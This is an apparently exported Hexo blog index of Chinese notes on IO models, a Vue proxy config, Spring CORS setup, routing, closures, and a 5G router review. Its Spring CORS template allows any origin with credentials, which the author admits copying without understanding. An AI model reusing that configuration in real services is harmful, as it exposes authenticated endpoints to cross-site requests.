<h3 id="四种主要的IO模型"><a href="#四种主要的IO模型" class="headerlink" title="四种主要的IO模型"></a>四种主要的IO模型</h3><p>（1）同步阻塞IO（Blocking IO）<br><img src="https://image.zfxt.top/hexo-blog/%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%EF%BC%88kotlin%EF%BC%89-2023-07-19-05-26.png"><br>首先，解释一下这里的阻塞与非阻塞：</p>
<p>阻塞IO，指的是需要内核IO操作彻底完成后，才返回到用户空间，执行用户的操作。阻塞指的是用户空间程序的执行状态，用户空间程序需等到IO操作彻底完成。传统的IO模型都是同步阻塞IO。在java中，默认创建的socket都是阻塞的。</p>
<p>其次，解释一下同步与异步：</p>
<p>同步IO，是一种用户空间与内核空间的调用发起方式。同步IO是指用户空间线程是主动发起IO请求的一方，内核空间是被动接受方。异步IO则反过来，是指内核kernel是主动发起IO请求的一方，用户线程是被动接受方。</p>
<p>（4）同步非阻塞IO（Non-blocking IO）<br><img src="https://image.zfxt.top/hexo-blog/%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%EF%BC%88kotlin%EF%BC%89-2023-07-07-24-33.png"><br>非阻塞IO，指的是用户程序不需要等待内核IO操作完成后，内核立即返回给用户一个状态值，用户空间无需等到内核的IO操作彻底完成，可以立即返回用户空间，执行用户的操作，处于非阻塞的状态。</p>
<p>简单的说：阻塞是指用户空间（调用线程）一直在等待，而且别的事情什么都不做；非阻塞是指用户空间（调用线程）拿到状态就返回，IO操作可以干就干，不可以干，就去干的事情。</p>
<p>非阻塞IO要求socket被设置为NONBLOCK。</p>
<p>强调一下，这里所说的NIO（同步非阻塞IO）模型，并非Java的NIO（New IO）库。</p>
<p>（3）IO多路复用（IO Multiplexing）<br><img src="https://image.zfxt.top/hexo-blog/%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%EF%BC%88kotlin%EF%BC%89-2023-07-11-04-51.png"><br>即经典的Reactor设计模式，有时也称为异步阻塞IO，Java中的Selector和Linux中的epoll都是这种模型。</p>
<p>（5）异步IO（Asynchronous IO）<br><img src="https://image.zfxt.top/hexo-blog/%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AF%B9%E8%AF%9D%EF%BC%88kotlin%EF%BC%89-2023-07-23-09-45.png"><br>异步IO，指的是用户空间与内核空间的调用方式反过来。用户空间线程是变成被动接受的，内核空间是主动调用者。</p>
<p>这一点，有点类似于Java中比较典型的模式是回调模式，用户空间线程向内核空间注册各种IO事件的回调函数，由内核去主动调用。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>网络IO</tag>
      </tags>
  </entry>
  <entry>
    <title>配置代理服务器和样式文件优化</title>
    <url>/posts/d58cfba6/</url>
    <content><![CDATA[<h1 id="配置代理服务器（方式1）"><a href="#配置代理服务器（方式1）" class="headerlink" title="配置代理服务器（方式1）"></a>配置代理服务器（方式1）</h1><p>前端从8080访问5000端口时会被cros拦截，因此在<code>vue.config.js</code>下配置一个代理服务器，他会替你转发命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//开启代理服务器</span><br><span class="line">devServer: &#123;</span><br><span class="line">  proxy: &#x27;http://localhost:5000&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不太完美</p>
<h2 id="更好的方法。（方式2）"><a href="#更好的方法。（方式2）" class="headerlink" title="更好的方法。（方式2）"></a>更好的方法。（方式2）</h2><p>开启代理服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">devServer:&#123;</span><br><span class="line">  proxy: &#123;</span><br><span class="line">      //请求前缀，（路径名）</span><br><span class="line">      &#x27;/api&#x27;:  &#123;</span><br><span class="line">          target: &#x27;&lt;url&gt;&#x27;,</span><br><span class="line">          pathRewrite:&#123;&#x27;^/api&#x27;:&#x27;&#x27;&#125;//用于去处前缀发送一个不带前缀的请求。</span><br><span class="line">          //当然，可以选择和后端服务器统一前缀，这样也可以不用去除前缀发送。</span><br><span class="line">          ws: true,//用于支持websocket</span><br><span class="line">          changeOrigin: true//用于控制请求头中的host字段</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;/foo&#x27;:  &#123;</span><br><span class="line">            target: &#x27;&lt;other_url&gt;&#x27;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="样式文件"><a href="#样式文件" class="headerlink" title="样式文件"></a>样式文件</h2><p>从第三方引入样式文件，如果放在&#x2F;src&#x2F;asset下面，那么需要通过import引入改样式，这样子引入的样式会经过vue-cli的严格检查，如果有需要使用但没有的文件，将会报错，无法正常使用。而如果放在&#x2F;public目录下，然后在index.html中引入，就不会有该问题。</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>配置跨域请求过滤器</title>
    <url>/posts/a5e89d98/</url>
    <content><![CDATA[<h2 id="配置一个CROS的模板类，暂且不考虑其中的原理，我也不会咯。"><a href="#配置一个CROS的模板类，暂且不考虑其中的原理，我也不会咯。" class="headerlink" title="配置一个CROS的模板类，暂且不考虑其中的原理，我也不会咯。"></a>配置一个CROS的模板类，暂且不考虑其中的原理，我也不会咯。</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zfxt.sjv.config;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>:zfx-t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>:1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrosConfiguration</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 允许跨域调用的过滤器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="literal">true</span>)</span><br><span class="line">                .maxAge(<span class="number">3600</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>CROS</tag>
      </tags>
  </entry>
  <entry>
    <title>路由模式：hash与history</title>
    <url>/posts/fa2e5412/</url>
    <content><![CDATA[<h1 id="hash模式，history模式"><a href="#hash模式，history模式" class="headerlink" title="hash模式，history模式"></a>hash模式，history模式</h1><p>hash模式：他不会像服务器发送hash值，也就是#后面的内容不会发送到服务器中。<br>history模式：会将路径内容发送到服务器中</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>闭包：函数访问外部变量</title>
    <url>/posts/a76224b3/</url>
    <content><![CDATA[<blockquote>
<p>该笔记引用自<a href="https://juejin.cn/post/7097141521102667813">掘金</a><br><a href="https://juejin.cn/post/7021129836982697997">闭包</a></p>
</blockquote>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>定义：</p>
<ul>
<li>（官方定义）闭包是函数和声明该函数的词法环境的组合。</li>
<li>闭包就是能够读取其他函数内部变量的函数。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。<br>产生条件：</li>
<li>一个函数，里面有一些变量和另一个函数</li>
<li>外部函数里面的函数使用了外部函数的变量</li>
<li>外部函数最后把它里面的那个函数用return抛出去<br>作用： </li>
<li>在函数外部可以读取函数内部的变量</li>
<li>让这些变量的值始终保持在内存中</li>
</ul>
]]></content>
      <tags>
        <tag>JS</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>饥荒联机服务器搭建 (本地、云服务器、双云服务器)</title>
    <url>/posts/c262d63/</url>
    <content><![CDATA[<p>直接查看该文章</p>
<p><strong>文章链接:</strong> <a href="https://mstzf.cn/posts/DoNotStarveTogether_Server/">https://mstzf.cn/posts/DoNotStarveTogether_Server/</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>重定向和转发</title>
    <url>/posts/79ac9ac2/</url>
    <content><![CDATA[<p><img src="https://image.zfxt.top/hexo-blog/%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E8%BD%AC%E5%8F%91-2024-07-02-12-36-38.jpg" alt="重定向和转发-2024-07-02-12-31-05"></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>简而言之，重定向就是servlet将新的URL返回给Location，浏览器获得Location值，访问新的URL。从时序图中可以看出，服务器只负责将新的URL注入Location，URL的转变是由浏览器完成的</p>
<h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>与重定向不同的是，转发的动作是在服务端完成，也就是说server直接将新的URL中的资源返回给浏览器，浏览器地址栏不变，用户察觉不到URL的转变。</p>
]]></content>
  </entry>
  <entry>
    <title>鲲鹏c8-650使用体验</title>
    <url>/posts/6cd0ffe7/</url>
    <content><![CDATA[<h2 id="开箱一台鲲鹏CPE，型号为鲲鹏C8-650，官方定位为青春极客产品。"><a href="#开箱一台鲲鹏CPE，型号为鲲鹏C8-650，官方定位为青春极客产品。" class="headerlink" title="开箱一台鲲鹏CPE，型号为鲲鹏C8-650，官方定位为青春极客产品。"></a>开箱一台鲲鹏CPE，型号为鲲鹏C8-650，官方定位为青春极客产品。</h2><img src="https://picx.zhimg.com/50/v2-61d4d131696822617d0a02cfcca04e56_720w.jpg?source=2c26e567" data-caption="" data-size="normal" data-rawwidth="776" data-rawheight="1200" data-original-token="v2-61d4d131696822617d0a02cfcca04e56" class="origin_image zh-lightbox-thumb" width="776" data-original="https://picx.zhimg.com/v2-61d4d131696822617d0a02cfcca04e56_r.jpg?source=2c26e567"/>

<p>我是3.21晚上十一点首发购买的，首发价格899，到货返还200，实际699到手，目前全面699价格铺货。先看一下产品和包装吧。</p>
<p><img src="https://picx.zhimg.com/50/v2-073769f4f86b4031565cbfad4617c012_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="4860" data-rawheight="2160" data-original-token="v2-073769f4f86b4031565cbfad4617c012" class="origin_image zh-lightbox-thumb" width="4860" data-original="https://picx.zhimg.com/v2-073769f4f86b4031565cbfad4617c012_r.jpg?source=2c26e567"/>C8系列同模具外壳<img src="https://pica.zhimg.com/50/v2-60aceb9d89102eb86b3dc3d033814c2c_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2835" data-rawheight="2160" data-original-token="v2-60aceb9d89102eb86b3dc3d033814c2c" class="origin_image zh-lightbox-thumb" width="2835" data-original="https://pic1.zhimg.com/v2-60aceb9d89102eb86b3dc3d033814c2c_r.jpg?source=2c26e567"/></p>
<p>右上角送的散热器 口罩防尘  赠品包括散热器、dc一分二、诱骗线特别说明：C8-650以及C8-668官方宣传为“支持开源”，原厂固件在系统备份升级一项中有刷写第二系统的入口。第二系统openwrt固件由玩家自制，C8-650的openwrt固件由周佬@Manper 制作，有幸成为第一位体验者，由于我是第一批三月底就拿到手的，当时C8-650的固件还没有制作，路由部分650主板与668完全一致，仅5G模块部分有所差异，到手时我就尝试刷入了668的第二系统，可以成功开机，模块部分也能识别，但是无法拨号上网。直入主题，下边是购买及使用体验：从去年七月份产生“使用移动网络给设备稳定供网”的想法开始，我先后使用了4G手机，5G手机usb共享网络+小米r3g路由器供网，以及4G随身wifi棒子+路由器供网，均无法满足日常需求，手机usb网络共享的方式连接路由器，经常会出现断电后手机无法成功自动开启usb网络共享，没有良好的无感体验；使用4G随身wifi棒子可以实现完美的来电来网体验，但是拉胯的4G网络，再加上用来中转的路由器（中兴e8822）性能太弱，在学校宿舍厕所内（一堵墙）会断网，且延迟高不太稳定，慢慢把视线转移到CPE上。考虑到北京移动不稳定随时翻车，再加上我有一张本地归属地的2023版199三折冰（套内包含200G通用+钉钉定向双不限流量包），因此想要购入一台可以刷入openwrt的路由器，哪怕在北移翻车无法使用后搭配199三折冰也可以实现实现流量自由(即ml)。囊中羞涩，售价699，mt7981方案，ax3000，5G模块采用春藤v510（移远rm500u-cnv）的鲲鹏C8-650发售后我就第一批购买了。使用体验方面，总体来讲十分满意，完美符合我的需求。C8-650有内置卡，同时也支持插入外置卡使用，卡槽位于机器底部，支持的卡板为nano小卡。我日常使用openwrt系统，1+8的配置对于我这种偶尔随便折腾折腾的人来讲完全够用。<img src="https://pic1.zhimg.com/50/v2-66d003a16e978d5b1e94ada76b222c2c_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2560" data-rawheight="1391" data-original-token="v2-66d003a16e978d5b1e94ada76b222c2c" class="origin_image zh-lightbox-thumb" width="2560" data-original="https://pic1.zhimg.com/v2-66d003a16e978d5b1e94ada76b222c2c_r.jpg?source=2c26e567"/>无风扇温度<img src="https://picx.zhimg.com/50/v2-5b6c2212cbd14b75c760372b43e27da9_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2560" data-rawheight="1391" data-original-token="v2-5b6c2212cbd14b75c760372b43e27da9" class="origin_image zh-lightbox-thumb" width="2560" data-original="https://pic1.zhimg.com/v2-5b6c2212cbd14b75c760372b43e27da9_r.jpg?source=2c26e567"/>无风扇模块温度<img src="https://picx.zhimg.com/50/v2-2ee71efa3ffa0c2e83ace3f39d03e1c6_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2560" data-rawheight="1398" data-original-token="v2-2ee71efa3ffa0c2e83ace3f39d03e1c6" class="origin_image zh-lightbox-thumb" width="2560" data-original="https://pica.zhimg.com/v2-2ee71efa3ffa0c2e83ace3f39d03e1c6_r.jpg?source=2c26e567"/>最新版固件已支持模块识别，锁频段小区日常使用，不加风扇温度高，但不影响使用，上图温度时测速表现如下：<img src="https://picx.zhimg.com/50/v2-0450cb7b9b77e28228a259214ea8d842_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1080" data-rawheight="2400" data-original-token="v2-0450cb7b9b77e28228a259214ea8d842" class="origin_image zh-lightbox-thumb" width="1080" data-original="https://pic1.zhimg.com/v2-0450cb7b9b77e28228a259214ea8d842_r.jpg?source=2c26e567"/>高温负载下速度不稳定，但不会断网官方实测rm500u测速能达到750mbps（下行），我自己实测（基于1000下行100上行的北京移动）在宿舍的网速最高能到550mbps，同时间同位置手机测速在600mbps，实际体验上cpe下行速度慢于手机，上行速度较快于手机，术业有专攻，多设备供网在体验和稳定性上cpe远远强于手机。测速如下图<img src="https://picx.zhimg.com/50/v2-4071d615daf2560e5a006fd9076baadc_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1944" data-rawheight="2160" data-original-token="v2-4071d615daf2560e5a006fd9076baadc" class="origin_image zh-lightbox-thumb" width="1944" data-original="https://picx.zhimg.com/v2-4071d615daf2560e5a006fd9076baadc_r.jpg?source=2c26e567"/>CPE最高550mbps，同位置手机680mbps。基站限速跑不满千兆速率同时，关于ml的可行性我也测试了一下，和部署在手机上的原理一样，具体我不展开讲，仅表示该方案可行，如图<img src="https://picx.zhimg.com/50/v2-fbec1f5ed52f136e14c9f4e75543974f_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="3078" data-rawheight="2160" data-original-token="v2-fbec1f5ed52f136e14c9f4e75543974f" class="origin_image zh-lightbox-thumb" width="3078" data-original="https://picx.zhimg.com/v2-fbec1f5ed52f136e14c9f4e75543974f_r.jpg?source=2c26e567"/>可行性✔️好用与否需要自行研究，这方面我了解的不是很深入由于C8-650，C8-668仅5G模块不同，C8-660存储配置较小，这三款主板均有m.2插槽，有群友想要更换模块使用，经大佬编译后，C8开源系列已经支持在openwrt下更换模块后自动识别rm500u，rm520n以及部分模块，C8-650的配置高售价低，不满于模块的也可以更换模块使用了。<img src="https://picx.zhimg.com/50/v2-6a208fae092d8e3d041ffe0c52f309e3_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="3888" data-rawheight="2160" data-original-token="v2-6a208fae092d8e3d041ffe0c52f309e3" class="origin_image zh-lightbox-thumb" width="3888" data-original="https://picx.zhimg.com/v2-6a208fae092d8e3d041ffe0c52f309e3_r.jpg?source=2c26e567"/>@Manper 周佬实力强大关于openwrt的玩法，例如alist，docker下的小雅alist，青龙面板等，以及酸酸乳，小猫咪等，mt7981和1+8的配置处理这些轻量化的任务还是能轻松胜任的，但是也正是因为mt7981，高温和处理器瓶颈是一大问题，做一台合格的cpe完全没问题，鲲鹏张导(前极路由创业者，现二次创业鲲鹏无限，布局5G终端)号称给产品做三年质保，相信只有强大的硬件已经足够的信心才能有这样的底气。<img src="https://picx.zhimg.com/50/v2-055bb1ce079a58856658f5aaa9691eb7_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1080" data-rawheight="2400" data-original-token="v2-055bb1ce079a58856658f5aaa9691eb7" class="origin_image zh-lightbox-thumb" width="1080" data-original="https://pic1.zhimg.com/v2-055bb1ce079a58856658f5aaa9691eb7_r.jpg?source=2c26e567"/>Nradio C8-650 No2  鲲鹏C8-650第二系统，可一键切换官方系统关于外网访问，原厂系统厂家并没有做外网访问功能，openwrt下cpe由移动网络供网时，没有ipv4公网，不过手机卡都有ipv6，可以通过ddns固定ipv6地址到域名，使用ipv6远程访问路由器，或者使用nps内网穿透，frp，ddns to等方式。我更倾向于自己搭建的服务而不是istore的ddns-to功能，下边简单介绍一下ddns ipv6的设置方式，教程很多，我简单描述一下<img src="https://pic1.zhimg.com/50/v2-d02b1ac8af4b47ffed179f9f89429088_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2100" data-rawheight="718" data-original-token="v2-d02b1ac8af4b47ffed179f9f89429088" class="origin_image zh-lightbox-thumb" width="2100" data-original="https://pic1.zhimg.com/v2-d02b1ac8af4b47ffed179f9f89429088_r.jpg?source=2c26e567"/>wan口放行<img src="https://picx.zhimg.com/50/v2-75428e540d54e5c5d411c8440732ab16_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2074" data-rawheight="510" data-original-token="v2-75428e540d54e5c5d411c8440732ab16" class="origin_image zh-lightbox-thumb" width="2074" data-original="https://picx.zhimg.com/v2-75428e540d54e5c5d411c8440732ab16_r.jpg?source=2c26e567"/>Lucky 域名解析<img src="https://pica.zhimg.com/50/v2-2901ee4d3bc3c54783540fbfc914bdb6_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="2072" data-rawheight="1202" data-original-token="v2-2901ee4d3bc3c54783540fbfc914bdb6" class="origin_image zh-lightbox-thumb" width="2072" data-original="https://picx.zhimg.com/v2-2901ee4d3bc3c54783540fbfc914bdb6_r.jpg?source=2c26e567"/>Lucky 端口转发<img src="https://picx.zhimg.com/50/v2-288d60950a387a4b12371afe1ed7bfbd_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1738" data-rawheight="218" data-original-token="v2-288d60950a387a4b12371afe1ed7bfbd" class="origin_image zh-lightbox-thumb" width="1738" data-original="https://picx.zhimg.com/v2-288d60950a387a4b12371afe1ed7bfbd_r.jpg?source=2c26e567"/>解析生效<img src="https://picx.zhimg.com/50/v2-1f27e547177ec7ced48116ad5988fc4a_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1944" data-rawheight="2160" data-original-token="v2-1f27e547177ec7ced48116ad5988fc4a" class="origin_image zh-lightbox-thumb" width="1944" data-original="https://picx.zhimg.com/v2-1f27e547177ec7ced48116ad5988fc4a_r.jpg?source=2c26e567"/>流量 模拟外网环境 ipv6访问ps:设置上没有问题，然而实际访问时有时可以访问到，有时又联不通，原因未知，在此虚心请教各位如何解决这一问题。长ping测试<img src="https://pica.zhimg.com/50/v2-eca3fb39db763ae552a2ec1d5b75bf69_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1022" data-rawheight="724" data-original-token="v2-eca3fb39db763ae552a2ec1d5b75bf69" class="origin_image zh-lightbox-thumb" width="1022" data-original="https://picx.zhimg.com/v2-eca3fb39db763ae552a2ec1d5b75bf69_r.jpg?source=2c26e567"/>左ping路由 右ping外网<img src="https://pic1.zhimg.com/50/v2-5d7596f40fd21df3e807e4c9891e7c09_720w.jpg?source=2c26e567" data-size="normal" data-rawwidth="1662" data-rawheight="662" data-original-token="v2-5d7596f40fd21df3e807e4c9891e7c09" class="origin_image zh-lightbox-thumb" width="1662" data-original="https://picx.zhimg.com/v2-5d7596f40fd21df3e807e4c9891e7c09_r.jpg?source=2c26e567"/><br>夜间进行持续长ping长ping时无散热，室内温度25℃，路由模块85℃，<br>高温负载下任稳定运行有部分鹏友表示650有断网断流现象，我在使用中也曾在某两天内多次遇到断流断网无法拨号的情况，原因未知，后续使用就再没有出现过。瑕不掩瑜，鲲鹏C8-650能完美符合我的需求，是一款性价比产品，也希望在后续使用中厂家能做好优化，搞好售后。</p>
<p>引用自:<a href="https://www.zhihu.com/question/33774281/answer/3468823863">https://www.zhihu.com/question/33774281/answer/3468823863</a></p>
]]></content>
  </entry>
</search>
